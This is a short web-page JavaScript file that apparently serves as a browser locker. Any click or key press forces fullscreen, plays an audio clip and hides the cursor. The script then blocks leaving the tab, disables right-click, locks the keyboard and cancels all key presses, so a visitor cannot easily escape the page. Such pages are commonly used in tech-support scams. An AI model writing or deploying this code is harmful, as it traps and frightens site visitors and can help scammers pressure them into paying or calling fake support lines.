// Function to enter fullscreen mode
function goFullscreen() {
    const elem = document.documentElement;
    const audio = document.getElementById('welcome-audio');

    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.mozRequestFullScreen) { // Firefox
        elem.mozRequestFullScreen();
    } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, and Opera
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { // IE/Edge
        elem.msRequestFullscreen();
    }

    // Show the fullscreen bar with the image when going fullscreen
    const fullscreenBar = document.getElementById('fullscreen-bar');
    fullscreenBar.style.display = 'flex';
    fullscreenBar.style.opacity = '1';

    // Play the welcome audio when entering fullscreen
    audio.play();

    // Add the hide cursor class when entering fullscreen
    document.body.classList.add('hide-cursor');
}

// Function to exit fullscreen mode
function exitFullscreen() {
    const audio = document.getElementById('welcome-audio');
    if (document.exitFullscreen) {
        document.exitFullscreen();
    } else if (document.mozCancelFullScreen) { // Firefox
        document.mozCancelFullScreen();
    } else if (document.webkitExitFullscreen) { // Chrome, Safari, and Opera
        document.webkitExitFullscreen();
    } else if (document.msExitFullscreen) { // IE/Edge
        document.msExitFullscreen();
    }

    // DO NOT hide the fullscreen bar when exiting fullscreen
    const fullscreenBar = document.getElementById('fullscreen-bar');
    fullscreenBar.style.display = 'flex'; // Ensure it stays visible

    // Remove the hide cursor class when exiting fullscreen
    document.body.classList.remove('hide-cursor');
}

// Event listener to go fullscreen on mouse click
document.body.addEventListener('click', goFullscreen);

// Event listener for keyboard press
document.addEventListener('keydown', (event) => {
    goFullscreen(); // Trigger fullscreen on any key press
});

// Event listener for fullscreen change
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
        exitFullscreen(); // Call the exit logic when exiting fullscreen
    }
});

// Prompt user before closing the tab
window.addEventListener('beforeunload', (event) => {
    const confirmationMessage = "Are you sure you want to leave this page? Your progress might be lost.";
    event.returnValue = confirmationMessage; // For some browsers
    return confirmationMessage; // For other browsers
});

// Disable right-click on the website
document.addEventListener('contextmenu', (event) => {
    event.preventDefault(); // Prevent the context menu from appearing
});

navigator.keyboard.lock();
document.onkeydown = function (e) {
return false;
}